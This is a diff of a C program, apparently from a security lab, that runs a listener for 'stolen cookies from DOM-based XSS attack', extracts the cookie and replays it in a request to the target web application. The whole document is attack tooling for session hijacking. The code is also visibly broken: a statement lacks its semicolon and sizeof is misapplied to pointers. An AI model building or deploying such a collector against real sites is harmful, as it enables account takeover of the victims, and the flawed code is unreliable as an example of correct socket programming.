@@ -103,7 +103,8 @@ static int bind_and_listen(int server_fd, struct sockaddr_in *server_addr)
   server_addr->sin_addr.s_addr = INADDR_ANY;
   server_addr->sin_port = htons(PORT);
 
-  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+  if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(*server_addr))
+      < 0) {
     return 0;
   }
 
@@ -194,11 +195,11 @@ static int send_request_to_web(const char *cookie_id)
 /*
  * ACCEPT CLIENT
  */
-static int accept_client(int server_fd, struct sockaddr_in *client_addr){
-  socklen_t  client_addr_len = sizeof(client_addr);
-  int client_fd = accept(server_fd, (struct sockaddr *)&client_addr,
-                         &client_addr_len);
-  return client_fd;
+static int accept_addr(int server_fd, struct sockaddr_in *addr){
+  socklen_t  addr_len = sizeof(addr);
+  int accept_fd = accept(server_fd, (struct sockaddr *)&addr,
+                         &addr_len);
+  return accept_fd;
 }
 
 int main(void) {
@@ -213,8 +214,10 @@ int main(void) {
     }
     // BIND AND LISTEN
     struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr))
     int bind_n_listen = bind_and_listen(server_fd, &addr);
     if (bind_n_listen!=1){
+      printf("closed bind and listen");
       close(server_fd);
       exit(EXIT_FAILURE);
     }
@@ -223,9 +226,9 @@ int main(void) {
     printf("Waiting for stolen cookies from DOM-based XSS attack...\n");
 
     // ACCEPT CLIENT
-    int client_fd = -1;
-    client_fd = accept_client(server_fd, &addr);
-    if (client_fd < 0){
+    int accept_fd = -1;
+    accept_fd = accept_addr(server_fd, &addr);
+    if (accept_fd < 0){
       close(server_fd);
       exit(EXIT_FAILURE);
     }
@@ -235,19 +238,19 @@ int main(void) {
     // READ CLIENT
     ssize_t bytes_read;
     memset(buffer, 0, BUFFER_SIZE);
-    bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
+    bytes_read = read(accept_fd, buffer, BUFFER_SIZE - 1);
     if (bytes_read < 0) {
-      close(client_fd);
+      close(accept_fd);
       close(server_fd);
       exit(EXIT_FAILURE);
     }
     buffer[bytes_read] = '\0';
 
   // EXTRACT COOKIE FROM STOLEN COOKIE
-  char cookie[256];
+  char cookie[BUFFER_SIZE];
   memset(cookie, 0, sizeof(cookie));
   if (!extract_cookie(buffer, cookie, sizeof(cookie))) {
-    close(client_fd);
+    close(accept_fd);
     close(server_fd);
     exit(EXIT_FAILURE);
   }
@@ -255,13 +258,13 @@ int main(void) {
   // SEND REQUEST TO WEB AND SAVE RESPONSE TO OUT FILE
   if (send_request_to_web(cookie)!=1){
 
-    close(client_fd);
+    close(accept_fd);
     close(server_fd);
     exit(EXIT_FAILURE);
   }
 
   // TERMINATE
-  close(client_fd);
+  close(accept_fd);
   close(server_fd);
   exit (EXIT_SUCCESS);
 
